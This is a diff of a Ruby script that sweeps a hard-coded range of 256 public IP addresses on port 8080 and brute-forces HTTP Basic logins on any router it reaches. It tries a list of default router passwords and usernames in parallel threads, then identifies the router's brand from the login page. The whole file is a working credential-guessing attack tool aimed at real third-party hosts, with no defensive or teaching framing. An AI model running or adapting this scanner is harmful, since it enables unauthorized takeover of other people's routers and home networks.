@@ -1,8 +1,8 @@
 require 'socket'
 require 'net/http'
 require "base64"
-
-
+require 'thread'
+require 'timeout'
 
 
 
@@ -12,28 +12,80 @@ class Rpw
 		@router=nil
 		@ip=ip
 		@port=port
+		
 	end
-	def detect_type(body_data)
-		routers = {:thomson => "Thomson", :cisco => "cisco ", :technicolor => "thecnicolor"}
-	end
-	def crack()
-		password = ["Swe-ty65", 'RdET23-10', 'TmcCm-651', 'Ym9zV-05n', 'Uq-4GIt3M',"superman"]
-		password = password.reverse()
-		user = ["admin","superman"]
-		user.each do |user_name| 
-			password.each  do |passwd|
-				uri = URI("http://#{@ip}:#{@port}")
-				req = Net::HTTP::Get.new(uri.request_uri)
-				req['Authorization']="basic #{Base64.encode64("admin:admin")}"
-				res = Net::HTTP.start(uri.hostname, uri.port) {|http| http.request(req) }
+	def test_connection()
+		begin 
+		 	Timeout.timeout(0.2) do       
 
-				print res.body
-				res.each {|head,value| print head," => ", value, "\n"}
+				if socket = TCPSocket.new(@ip, @port)
+					return true
+
+				end
 			end
+		rescue	Timeout::Error
+
+			return false
+
 		end
 	end
+	def detect(body_data)
+		routers = {:thomson => "Thomson", :cisco => "cisco ", :technicolor => "thecnicolor"}
+		body_data.each {|data,value| print data," = > ",value,"\n"}
+
+		routers.each do |data, re|
+			if body_data.body.match(re)
+				puts data
+			end
+		end
+
+	end
+	def crack()
+		password = ["Swe-ty65", 'RdET23-10', 'TmcCm-651', 'Ym9zV-05n', 'Uq-4GIt3M',"superman","admin"]
+		password = password.reverse()
+		user = ["admin","superman"]
+		threads = []
+		credential = []
+		
+		user.each do |user_name| 
+			password.each  do |passwd|
+				threads << Thread.new{credential << login_request(user_name,passwd)}
+				
+				if(threads.size()%5 == 0 && threads.size() != 0)
+					threads.each(&:join)
+					threads=[]
+				end
+			end
+		end
+		threads.each(&:join)
+		credential.each do |rta|
+			if rta[0].code == "200"
+				print "ok"
+				return rta
+			end
+			
+		end
+		return false
+	end
+	def login_request(user_name,passwd)
+		print "."
+		uri = URI("http://#{@ip}:#{@port}")
+		req = Net::HTTP::Get.new(uri.request_uri)
+		req['Authorization']="Basic #{Base64.encode64("#{user_name}:#{passwd}")}"
+		res = Net::HTTP.start(uri.hostname, uri.port) {|http| http.request(req) }
+		return res,[user_name , passwd]
+	end
 end
+ c=0
+for i in (0..255)
+	router = Rpw.new("190.158.217.#{i}",8080) 
+	if router.test_connection
+		print "#{c}) 190.158.217.#{i}: "
+		if win=router.crack() 
+			router.detect(win[0])
+			c+=1
+		end
+	end
 
-
-
+end
 
